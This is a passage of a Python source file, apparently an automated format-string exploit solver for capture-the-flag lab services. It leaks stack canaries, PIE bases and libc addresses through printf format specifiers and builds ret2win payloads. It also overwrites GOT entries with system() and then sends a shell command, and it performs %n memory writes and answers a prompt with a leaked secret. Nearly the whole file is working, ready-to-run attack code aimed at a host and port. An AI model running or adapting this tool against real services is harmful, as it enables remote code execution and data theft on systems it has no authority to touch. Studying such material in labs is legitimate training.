        for k in sorted(d1):
            v = d1[k]
            if not pointerish(v, bits):
                continue
            for s in by_low.get(v & 0xFFF, []):
                base = v - s
                if base > 0 and base & 0xFFF == 0:
                    votes.setdefault(k, []).append(s)
        # A slot matching exactly one site is unambiguous; prefer those.
        for k, ss in sorted(votes.items(), key=lambda kv: (len(kv[1]), kv[0])):
            pies.append((k, ss[0]))
        if not pies:
            log("[-] leakbof: PIE binary but no stack slot matches a code address's low 12 bits")
            return False
        log(f"[*] leakbof: code-pointer candidates {[(k, hex(s)) for k, s in pies[:4]]} (slot, file offset)")

    if not need_canary and not need_pie:
        log("[-] leakbof: no canary and no PIE - nothing to leak; plain ret2win applies")
        return False

    gad = ap.gadgets_for(args.binary)
    try:
        wargs = ap.extract_win_args(args.binary) or None
    except Exception:                               # noqa: BLE001
        wargs = None
    co_deltas = (16, 12, 8, 20, 24) if bits == 32 else (16, 24, 8, 32)
    plans = []
    for co_d in (co_deltas if need_canary else (0,)):
        for off in offsets[:5]:
            for ck in (canaries[:3] if need_canary else [None]):
                for pk in (pies[:3] if need_pie else [None]):
                    for align in ((False, True) if bits == 64 else (False,)):
                        for wa in ([wargs, None] if wargs else [None]):
                            plans.append((off, off - co_d if need_canary else None, ck, pk, align, wa))
    log(f"[*] leakbof: {len(plans)} plan(s); offsets {offsets[:5]} from the binary's frames")
    for n, (off, co, ck, pk, align, wa) in enumerate(plans, 1):
        if time.time() > st["deadline"]:
            log(f"[!] leakbof: out of time after {n - 1} plan(s)")
            return False
        for wname, waddr in wins.items():
            want = [k for k in (ck, pk[0] if pk else None) if k is not None]
            leak = M1 + b"|".join(b"%%%d$p" % k for k in want) + M2
            try:
                s, _banner = cx.t.open()
            except OSError:
                continue
            out = b""
            try:
                s.sendall(leak + b"\n")
                r1 = cx.t._recv(s, until=M2)
                body = between(r1)
                if body is None:
                    continue
                got = [int(x, 16) if x.startswith(b"0x") else 0 for x in body.split(b"|")]
                canary = got[0] if ck is not None else None
                base = (got[-1] - pk[1]) if pk else 0
                target = base + waddr
                g2 = {k: [a + base for a in v] for k, v in gad.items()} if base else gad
                if canary is not None:
                    pl = ap.build_with_canary(off, target, co, canary, bits, "little", wa, align, g2)
                else:
                    pl = ap.build_ret2win(off, target, bits, "little", wa, align, g2)
                if pl is None or b"\n" in pl:
                    continue
                s.sendall(pl + b"\n")
                out = cx.t._recv(s)
                for line in ("", args.cmd, "exit"):
                    if cx.t.closed:
                        break
                    try:
                        s.sendall(line.encode() + b"\n")
                    except OSError:
                        break
                    out += cx.t._recv(s)
            except OSError:
                pass
            finally:
                s.close()
            if args.verbose:
                log(f"    plan {n}: off={off} canary_off={co} slot={ck} pie={pk} align={align} -> {out[-80:]!r}")
            f = flag_in(out, b"", args.flag_regex)
            if f:
                bits_txt = []
                if ck is not None:
                    bits_txt.append(f"canary {hex(canary)} from %{ck}$p, written back at +{co}")
                if pk:
                    bits_txt.append(f"PIE base {hex(base)} from %{pk[0]}$p")
                return solved(f, f"fmt leak then ret2win {wname}: " + "; ".join(bits_txt)
                              + f"; return address at +{off}" + (" (+ret for alignment)" if align else ""), out)
    log("[-] leakbof: no plan produced a flag")
    return False


def second_input(t):
    """Does the service ask for something AFTER the printf? (Then a leak can be used in
    the same connection: answer the question, or overflow the next read.)"""
    try:
        s, _b = t.open()
    except OSError:
        return False
    try:
        s.sendall(M1 + M2 + b"\n")
        out = t._recv(s, max_wait=1.5)
        if t.closed or M2 not in out:
            return False
        # The SAME prompt again means a loop (printf can be called repeatedly); a different
        # one means a new question. They enable different attacks, so tell them apart.
        last = lambda b: b.rstrip(b" ").rsplit(b"\n", 1)[-1].strip()
        return "loop" if last(out) and last(out) == last(_b) else "question"
    except OSError:
        return False
    finally:
        s.close()


LIBCS = {32: ["/lib32/libc.so.6", "/lib/i386-linux-gnu/libc.so.6", "/usr/lib32/libc.so.6"],
         64: ["/lib/x86_64-linux-gnu/libc.so.6", "/lib64/libc.so.6", "/usr/lib/libc.so.6"]}


def libc_syms(path, names):
    out = subprocess.run(["readelf", "-sW", "--dyn-syms", path], capture_output=True, text=True).stdout
    syms = {}
    for ln in out.splitlines():
        f = ln.split()
        # FUNC only: an IFUNC (strcmp, strlen, memcpy...) resolves at run time to a CPU-
        # specific variant, so its GOT value is not `base + symbol` and would give a bogus,
        # non-aligned base.
        if len(f) > 7 and f[3] == "FUNC":
            nm = f[7].split("@")[0]
            if nm in names and nm not in syms:
                syms[nm] = int(f[1], 16)
    return syms


def goal_gotsys(cx, args, st, elf, rep):
    """The lab's last exercise, made to work with ASLR on: no win(), printf(input) in a
    LOOP. Round 1 reads a libc pointer out of the GOT with %s; round 2 overwrites
    printf's GOT slot with system(); round 3 is the command - all in one connection,
    because libc moves on every connect.

    system()'s offset is taken from a LOCAL libc (or --libc). Two GOT entries are leaked
    and must agree on the same page-aligned base; if they do not, the remote libc is a
    different build and this says so instead of writing a wrong address."""
    if not elf:
        log("[-] gotsys: needs --binary")
        return False
    got = rep.get("got") or {}
    if rep.get("relro") == "full" or rep.get("pie") or not got:
        log("[-] gotsys: needs a writable GOT at a fixed address")
        return False
    libc = args.libc or next((p for p in LIBCS[cx.bits] if os.path.exists(p)), None)
    if not libc:
        log("[-] gotsys: no local libc for this word size; pass --libc")
        return False
    lsym = libc_syms(libc, set(got) | {"system"})
    if "system" not in lsym:
        log(f"[-] gotsys: no system() in {libc}")
        return False
    # Called with OUR buffer as its first argument: printf in a loop, or the lab's strdup.
    targets = [f for f in ("printf", "strdup", "puts", "strlen", "atoi", "free") if f in got]
    prefer = ["puts", "printf", "fgets", "setvbuf", "getchar", "fflush", "read", "gets",
              "putchar", "write", "exit"]
    leakable = [f for f in prefer if f in got and f in lsym] + \
               [f for f in got if f in lsym and f not in prefer and not f.startswith("_")]
    if not targets or len(leakable) < 1:
        log("[-] gotsys: no GOT entry to redirect, or none that the local libc knows")
        return False
    w = cx.word
    for tgt in targets[:3]:
        if time.time() > st["deadline"]:
            break
        try:
            s, _b = cx.t.open()
        except OSError:
            continue
        try:
            bases = {}
            # leak the entries the program has certainly called already (so they hold a
            # libc address, not a PLT stub): the target itself comes second for that reason
            for fn in ([f for f in leakable if f != tgt] + [tgt])[:6]:
                payload = cx.read_payload(got[fn])
                if not cx.check(payload, f"read {fn}@GOT"):
                    continue
                s.sendall(payload + b"\n")
                body = between(cx.t._recv(s, until=M2))
                if not body:
                    continue
                ptr = int.from_bytes(body[:w].ljust(w, b"\x00")[:w] if cx.bits == 32
                                     else body[:6].ljust(8, b"\x00"), "little")
                base = ptr - lsym[fn]
                if base > 0 and base & 0xFFF == 0:
                    bases.setdefault(base, []).append(fn)
            if not bases:
                log("[-] gotsys: no GOT entry gave a page-aligned libc base - the remote libc "
                    "is not this machine's. Get the target's libc and pass --libc.")
                return False
            base, agree = max(bases.items(), key=lambda kv: len(kv[1]))
            if len(agree) < 2 and len(leakable) >= 2:
                log(f"[!] gotsys: only {agree} fits base {hex(base)}; the remote libc may differ "
                    f"from {libc}. Trying anyway.")
            system = base + lsym["system"]
            log(f"[*] gotsys: libc base {hex(base)} (agreed by {', '.join(agree)}), "
                f"system() = {hex(system)}; redirecting {tgt}@GOT")
            payload = cx.write_payload(cx.split(got[tgt], system, 4 if cx.bits == 32 else 6, 2))
            if not cx.check(payload, f"{tgt}@GOT -> system"):
                continue
            s.sendall(payload + b"\n")
            cx.t._recv(s, max_wait=6.0, idle=0.8)
            out = b""
            for line in (args.cmd, args.cmd):
                try:
                    s.sendall(line.encode() + b"\n")
                except OSError:
                    break
                out += cx.t._recv(s)
                if flag_in(out, b"", args.flag_regex):
                    break
        except OSError:
            out = b""
        finally:
            s.close()
        f = flag_in(out, b"", args.flag_regex)
        if f:
            return solved(f, f"GOT -> system: libc leaked through {agree[0]}@GOT, {tgt}@GOT "
                             f"overwritten with system() at {hex(system)}, then a command", out)
    log("[-] gotsys: the overwrite did not produce a flag")
    return False


def _words_to_bytes(vals, lo, hi, bits):
    pk = "<Q" if bits == 64 else "<I"
    return b"".join(struct.pack(pk, vals.get(k, 0) & ((1 << bits) - 1)) for k in range(lo, hi))


def banner_addresses(cx):
    """Fixed (non-stack) addresses the service itself prints before the prompt, e.g.
    "The genie's wish counter lives at 0x80e3f3c". Only ones that are the same on two
    connections: an address that moves must be used in the connection that printed it."""
    seen = []
    for _ in range(2):
        try:
            s, banner = cx.t.open()
            s.close()
        except OSError:
            return []
        seen.append({int(h, 16) for h in re.findall(rb"0x[0-9a-fA-F]{6,16}", banner or b"")})
    stack = lambda v: 0xF7000000 <= v <= 0xFFFFFFFF or v >= 0x7F0000000000
    return sorted(a for a in (seen[0] & seen[1]) if not stack(a))


def goal_paper(cx, args, st, given=None):
    """The lab's two exercises with the address given on PAPER and no binary: "the secret
    is at 0x804c060" (read it with %s) and "make the variable at X equal V" (%n). Each
    address is read first; then each number in the notes is written to it, and with no
    number a 1 ("make it non-zero")."""
    import auto_pwn
    stack = lambda v: 0xF7000000 <= v <= 0xFFFFFFFF or v >= 0x7F0000000000
    addrs = [a for a in auto_pwn.paper("address") if not stack(a)]
    values = [v for v in auto_pwn.paper("number") if 0 <= v <= 0xFFFFFFFF] or [1]
    if given is not None:                            # addresses printed by the service, not by the notes
        addrs, values = list(given), [1]
    origin = "printed by the service" if given is not None else "from your notes"
    both = "the address is " + origin if given is not None else "both from your notes"
    for addr in addrs[:4]:
        log(f"[*] address {hex(addr)} ({origin}): reading it as a string")
        out, payload = read_at(cx, addr)
        f = out and flag_in(out, payload, args.flag_regex)
        if f:
            solved(f, f"%s read of {hex(addr)} (address {origin})")
            return True
    # Two addresses and it is the GOT exercise: one is a GOT entry, the other is win().
    # Which is which is not guessed from the wording - both directions are tried; the wrong
    # one costs one crashed connection.
    for dst in addrs[:3]:
        for src in addrs[:3]:
            if src == dst or time.time() > st["deadline"]:
                continue
            log(f"[*] writing the address {hex(src)} over the word at {hex(dst)} ({both})")
            for size in ((4,) if cx.bits == 32 else (8, 4)):
                r = fire_write(cx, args, cx.split(dst, src, size, 2), f"{hex(dst)} -> {hex(src)}")
                if r and r[0]:
                    solved(r[0], f"after pointing {hex(dst)} at {hex(src)} ({origin})")
                    return True
    for addr in addrs[:4]:
        for v in values[:4]:
            if time.time() > st["deadline"]:
                return False
            log(f"[*] writing {hex(v)} to {hex(addr)} ({both}"
                + ("" if auto_pwn.paper("number") else "; no value given, so 1 = non-zero") + ")")
            r = fire_write(cx, args, cx.split(addr, v, 4, 2), f"write {hex(v)} to {hex(addr)}")
            if r and r[0]:
                solved(r[0], f"after writing {hex(v)} to {hex(addr)} ({origin})")
                return True
    return False


def goal_echo(cx, args, st, elf=None, rep=None):
    """printf(input) first, then a QUESTION whose answer is lying on the stack: a random
    number to guess, a password read from a file. Leak it and say it back, in the same
    connection (a random secret is different on every connect).

    A 32-bit int on a 64-bit stack can occupy either HALF of an 8-byte word, so both
    halves are candidates; `%d` on the slot would only ever show the low one."""
    bits, w = cx.bits, cx.word
    d1 = st.setdefault("dump", dump(cx.t, 1, args.slots + 1, cx.maxlen))
    if not d1:
        log("[-] echo: no stack words came back")
        return False
    image = []
    if elf:
        image = [(x["addr"], x["addr"] + max(x.get("size") or 0, 1)) for x in elf.sections if x.get("addr")]

    def ptr_like(v):
        if any(lo <= v < hi for lo, hi in image):
            return True
        if bits == 64:
            return (v >> 40) in (0x55, 0x56, 0x7F) or (v >> 44) == 0x7
        return (v >> 24) in (0xF7, 0xFF, 0x56, 0x57, 0xBF)

    def asciiish(v, n):
        b = v.to_bytes(n, "little").rstrip(b"\x00")
        return len(b) >= 2 and all(32 <= c < 127 or c in (10, 13) for c in b)

    hi_slot = max(d1)
    blob = _words_to_bytes(d1, 1, hi_slot + 1, bits)
    plans = []                                       # (kind, slot_lo, slot_hi, detail)
    # strings first: a password is unmistakable, a number is one of many
    for m in re.finditer(rb"[\x21-\x7e][\x20-\x7e]{4,}", blob):
        run = m.group(0)
        if b"%" in run or b"QZ<" in run or b">ZQ" in run or b"$p" in run:
            continue                                 # our own payload, echoed on the stack
        a = m.start()
        plans.append(("str", 1 + a // w, 1 + (m.end() - 1) // w + 1, a % w))
    # Numbers whose bytes happen to be printable are tried LAST, not dropped: a random
    # secret such as 0x7e41 is "A~" as text, and discarding it made a correct exploit
    # fail about one run in ten. Those words are usually our own payload on the stack, so
    # they are the least likely - but least likely is a position in the queue, not a no.
    late = []
    for k in sorted(d1):
        v = d1[k]
        if not v or ptr_like(v):
            continue
        if bits == 64:
            lo32, hi32 = v & 0xFFFFFFFF, v >> 32
            for half, part in (("lo", lo32), ("hi", hi32)):
                if part:
                    (late if asciiish(part, 4) else plans).append(("num", k, k + 1, half))
            if hi32 and lo32:
                (late if asciiish(v, 8) else plans).append(("num", k, k + 1, "full"))
        else:
            (late if asciiish(v, 4) else plans).append(("num", k, k + 1, "lo"))
            if v >= 0x80000000:
                plans.append(("num", k, k + 1, "signed"))
    plans += late
    if not plans:
        log("[-] echo: nothing on the stack looks like a secret (no text, no plain number)")
        return False
    nstr = sum(1 for p_ in plans if p_[0] == "str")
    log(f"[*] echo: {nstr} text candidate(s) and {len(plans) - nstr} number candidate(s) on the "
        f"stack; leaking each and answering the next prompt with it")
    for kind, lo, hi, how in plans[:120]:
        if time.time() > st["deadline"]:
            log("[!] echo: out of time")
            return False
        leak = M1 + b"|".join(b"%%%d$p" % k for k in range(lo, hi)) + M2
        if cx.maxlen and len(leak) > cx.maxlen:
            continue
        try:
            s, _banner = cx.t.open()
        except OSError:
            continue
        out, answer = b"", b""
        try:
            s.sendall(leak + b"\n")
            body = between(cx.t._recv(s, until=M2))
            if body is None:
                continue
            vals = {}
            for k, tok in zip(range(lo, hi), body.split(b"|")):
                tok = tok.strip()
                vals[k] = int(tok, 16) if tok.startswith(b"0x") else 0
            if kind == "str":
                raw = _words_to_bytes(vals, lo, hi, bits)[how:]
                m = re.match(rb"[\x20-\x7e]+", raw)
                answer = m.group(0) if m else b""
            else:
                v = vals.get(lo, 0)
                n = {"lo": v & 0xFFFFFFFF, "hi": v >> 32, "full": v,
                     "signed": (v & 0xFFFFFFFF) - (1 << 32)}[how]
                answer = b"%d" % n
            if not answer:
                continue
            s.sendall(answer + b"\n")
            out = cx.t._recv(s)
            if not cx.t.closed and not flag_in(out, b"", args.flag_regex):
                s.sendall(args.cmd.encode() + b"\n")
                out += cx.t._recv(s)
        except OSError:
            pass
        finally:
            s.close()
        if args.verbose:
            log(f"    {kind} slot {lo}{'/' + str(how) if kind == 'num' else ''}: answered {answer[:40]!r} -> {out[-60:]!r}")
        f = flag_in(out, b"", args.flag_regex)
        if f:
            what = (f"the text {answer!r} at stack slots {lo}..{hi - 1}" if kind == "str"
                    else f"the number {answer.decode()} from %{lo}$p ({how} half)" if bits == 64
                    else f"the number {answer.decode()} from %{lo}$p")
            return solved(f, f"leaked {what} and answered the next prompt with it")
    log("[-] echo: no leaked value was accepted")
    return False


# ----------------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="format-string solver: read, write, GOT, leak-then-overflow")
    ap.add_argument("host"); ap.add_argument("port", type=int)
    ap.add_argument("--binary")
    ap.add_argument("--goal", default="auto",
                    choices=["auto", "dump", "stack", "strings", "globals", "guard", "got",
                             "leakbof", "echo", "gotsys", "read", "write"])
    ap.add_argument("--pre", action="append", default=[], metavar="LINE",
                    help="line(s) to send before the format string (menu choice, name, ...)")
    ap.add_argument("--addr", help="--goal read/write: the address")
    ap.add_argument("--value", help="--goal write: the value")
    ap.add_argument("--size", type=int, default=4, help="--goal write: bytes to write (default 4)")
    ap.add_argument("--slots", type=int, default=64, help="how many stack words to look at")
    ap.add_argument("--slot", type=int, help="printf argument index of our buffer (default: found)")
    ap.add_argument("--bits", type=int, choices=[32, 64])
    ap.add_argument("--maxlen", type=int, help="bytes of one line that reach printf (default: measured)")
    ap.add_argument("--libc", help="--goal gotsys: the target's libc (default: this machine's)")
    ap.add_argument("--cmd", default=DEFAULT_CMD, help="sent after a write, in case win() is a shell")
    ap.add_argument("--flag-regex")
    # "AUTO" is what solve.py writes into the command it PRINTS and substitutes when it
    # runs it. Pasted by hand it used to die with "invalid float value: 'AUTO'".
    ap.add_argument("--budget", type=lambda v: 50.0 if str(v).upper() == "AUTO" else float(v),
                    default=50.0, help="seconds for the whole run")
    ap.add_argument("--idle", type=float, default=0.35)
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    t0 = time.time()
    st = {"deadline": t0 + args.budget}
    elf, rep = load_elf(args.binary)
    txt = disasm(args.binary) if args.binary else ""
    t = Target(args.host, args.port, pre=args.pre, idle=args.idle, verbose=args.verbose)

    # Is this input a format string at all? Asked first and answered in one connection,
    # because every later step assumes yes - on a service with no such bug the slot
    # search alone used to run for minutes, straight through the time budget.
    # What does a HARMLESS input get back? Flag-shaped text in that reply is furniture -
    # "(Reminder: flags look like SIT{example_flag_here}.)" was once reported as the flag,
    # labelled "a pointer on the stack", in 4 s. Same rule as auto_pwn's (round 51).
    try:
        import flags as _fl
        calm = t.shot(b"x")
        seen = _fl.learn_ignore(calm or b"")
        shown = [x for x in seen if not any(o != x and o in x for o in seen)]
        if shown:
            log(f"[!] DIAGNOSIS: the service answers a HARMLESS input with flag-shaped text: {', '.join(shown[:4])}")
            log("[!] It is not reported as solved, because no exploit earned it - it may be an example.")
            log(f"[!] But if this question is simply 'connect and type anything', your flag is:   {shown[0]}")
    except Exception as exc:                        # noqa: BLE001
        log(f"[!] BUG while taking the harmless-input baseline: {type(exc).__name__}: {exc}")
    probe = between(t.shot(M1 + b"%1$p" + M2, post=(), until=M2))
    if probe is not None and probe.strip() == b"%1$p":
        log("[!] the service echoes %1$p back literally: this input is NOT used as a format "
            "string. If the bug is behind a menu or a first prompt, pass --pre LINE.")
        return 1
    if probe is None:
        log("[!] nothing recognisable came back for a marker probe - the format string may "
            "not be the FIRST input (pass --pre LINE for each input before it), or the "
            "service does not print what it reads.")
        if args.goal == "auto" and not args.pre:
            return 1
    maxlen = args.maxlen or measure_maxlen(t)
    if maxlen is None:
        maxlen = 100
    bits = args.bits or rep.get("bits")
    slot, pad = args.slot, 0
    if slot is None:
        slot, pad, bits = find_slot(t, bits, maxlen, deadline=t0 + args.budget * 0.5)
    if slot is None:
        # The buffer may not be on the stack (a global or heap buffer). Reads of the
        # stack still work; anything that needs an address in the payload does not.
        log("[!] our own input is not visible in printf's arguments (buffer not on the stack?)")
        bits = bits or 32
    else:
        log(f"[*] {bits}-bit, our buffer is printf argument {slot}"
            + (f" after {pad} alignment byte(s)" if pad else "")
            + f"; {maxlen} bytes per line reach printf")
    bad = b"\n"
    try:
        import auto_pwn
        b2, why = auto_pwn.auto_badchars(args.binary)
        if why and "scanf" in why:
            bad = bytes(set(b2) - {0}) or b"\n"
    except Exception:                               # noqa: BLE001
        pass
    cx = Ctx(t, bits, slot or 1, pad, maxlen, bad)
    if slot is not None:
        out = t.shot(b"P" * pad + M1 + M2, post=(), until=M2)
        a = out.find(M1)
        lead = out[:a].rsplit(b"\n", 1)[-1] if a >= 0 else b""
        lead = lead[:len(lead) - pad] if pad else lead
        if lead:
            L = len(lead)
            cx.counts = [L, 0] if (L + pad) % cx.word == 0 else [0, L]
            log(f"[*] {L} character(s) ({lead[-20:]!r}) precede our input on its line; "
                f"%n counts them only if the same printf printed them - trying "
                f"{cx.counts[0]} first, then {cx.counts[1]}")
    need_slot = lambda: slot is not None or log("[-] skipped: needs our buffer on the stack") or False

    if args.goal == "dump":
        vals = dump(t, 1, args.slots + 1, maxlen)
        for k in sorted(vals):
            v = vals[k]
            asc = struct.pack("<Q" if bits == 64 else "<I", v & ((1 << bits) - 1))
            log(f"  %{k}$p = {v:#0{bits // 4 + 2}x}  {''.join(chr(c) if 32 <= c < 127 else '.' for c in asc)}")
        return 0
    if args.goal == "read":
        if not args.addr or not need_slot():
            sys.exit("[!] --goal read needs --addr")
        out, payload = read_at(cx, int(args.addr, 0))
        if out is None:
            return 1
        body = between(out)
        log(f"[*] string at {args.addr}: {body!r}")
        f = flag_in(out, payload, args.flag_regex)
        if f:
            solved(f, f"%s read of {args.addr}")
        return 0 if (f or body) else 1
    if args.goal == "write":
        if not args.addr or args.value is None or not need_slot():
            sys.exit("[!] --goal write needs --addr and --value")
        addr, value = int(args.addr, 0), int(args.value, 0)
        r = fire_write(cx, args, cx.split(addr, value, args.size, 2), f"write {hex(value)} to {hex(addr)}")
        if r is None:
            return 1
        log(f"[*] wrote {hex(value)} to {hex(addr)} ({args.size} bytes, %hn pieces)")
        if r[0]:
            solved(r[0], "after the write")
            return 0
        log("[*] reply tail:\n" + r[1][-400:].decode("latin-1", "replace"))
        return 1

    # auto: cheapest and best-evidenced first. Every step is a handful of connections
    # except `strings`, which is one per pointer slot and therefore goes late.
    steps = {
        "stack":   lambda: goal_stack(cx, args, st),
        "guard":   lambda: need_slot() and goal_guard(cx, args, st, elf, rep, txt),
        "got":     lambda: need_slot() and goal_got(cx, args, st, elf, rep, txt),
        "leakbof": lambda: goal_leakbof(cx, args, st, elf, rep, txt),
        "echo":    lambda: goal_echo(cx, args, st, elf, rep),
        "gotsys":  lambda: need_slot() and goal_gotsys(cx, args, st, elf, rep),
        "paper":   lambda: need_slot() and goal_paper(cx, args, st),
        "banner":  lambda: need_slot() and goal_paper(cx, args, st, given=st.get("banner_addrs") or []),
        "strings": lambda: goal_strings(cx, args, st),
        "globals": lambda: need_slot() and goal_globals(cx, args, st, elf, rep),
    }
    if args.goal != "auto":
        order = [args.goal]
    else:
        order = ["stack"]
        try:
            import auto_pwn as _ap
            if _ap.paper("address"):
                order.append("paper")
        except Exception:                           # noqa: BLE001
            pass
        if elf:
            wins = bool(rep.get("win_symbols"))
            if wins and (rep.get("canary") or rep.get("pie")):
                order.append("leakbof")
            if rep.get("data_symbols") and not rep.get("pie"):
                order.append("guard")
            if wins and rep.get("relro") != "full" and not rep.get("pie"):
                order.append("got")
        # A question after the printf means a leak can be answered back. Checked on the
        # wire, so a single-shot service does not pay for it.
        two = second_input(t)
        st["single_shot"] = not two
        if two == "loop":
            log("[*] the same prompt comes back after the printf: it can be called again "
                "in one connection (leak, then write)")
            if elf and not rep.get("win_symbols"):
                order.append("gotsys")
        elif two:
            log("[*] the service asks something else after the printf: leak-then-answer and "
                "leak-then-overflow are possible")
            order.append("echo")
        if not two and "leakbof" in order:
            order.remove("leakbof")
            order.append("leakbof")              # still tried, but not ahead of real leads
        order += ["strings"]
        if elf:
            order.append("globals")
            order += [g for g in ("guard", "got", "leakbof") if g not in order]
        # Last, so nothing above changes: the service printed a fixed address and nothing
        # else explained it - read it, then make it non-zero (the lab's "genie" with the
        # counter's address in the banner and no binary to name it).
        st["banner_addrs"] = banner_addresses(cx)
        if st["banner_addrs"]:
            order.append("banner")
    for g in order:
        if time.time() > st["deadline"]:
            log(f"[!] budget of {args.budget:.0f}s used up before '{g}' (raise --budget)")
            break
        log(f"--- {g}")
        try:
            if steps[g]():
                log(f"[*] {t.conns} connection(s), {time.time() - t0:.1f}s")
                return 0
        except OSError as exc:
            log(f"[!] {g}: connection problem: {exc}")
    log(f"[!] no flag. {t.conns} connection(s), {time.time() - t0:.1f}s. "
        f"Try --goal dump to look at the stack yourself, or --verbose.")
    if slot is not None and args.goal == "auto" and elf and rep.get("pie") and st.get("single_shot"):
        log("[!] DIAGNOSIS: this IS a format-string bug, but the binary is PIE (its addresses move every "
            "run) and the service calls printf ONCE and exits.")
        log("[!] One printf can leak an address OR write to one - not both, and the write needs the leak. "
            "So nothing that needs an address in THIS binary can be done here.")
        log(f"[!] What still works is reading what is already on the stack:  python3 "
            f"{os.path.abspath(__file__)} {args.host} {args.port} --goal dump   (look for the flag or a secret)")
        log("[!] If the question needs a WRITE, it is beyond what the labs teach - move on.")
    if slot is None and args.goal == "auto":
        # The one fact that explains the whole failure was logged once, near the top.
        log("[!] DIAGNOSIS: this IS a format-string bug (%p prints stack values), but what you type "
            "is NOT on the stack - the program keeps it in a global or heap buffer.")
        log("[!] That rules out everything that plants an address in the input: %s at an address, "
            "%n writes, a GOT overwrite.")
        log(f"[!] What still works is reading what is already on the stack:  python3 "
            f"{os.path.abspath(__file__)} {args.host} {args.port} --goal dump   (look for the flag or a secret)")
        log("[!] If the question needs a WRITE, it is beyond what the labs teach - move on.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
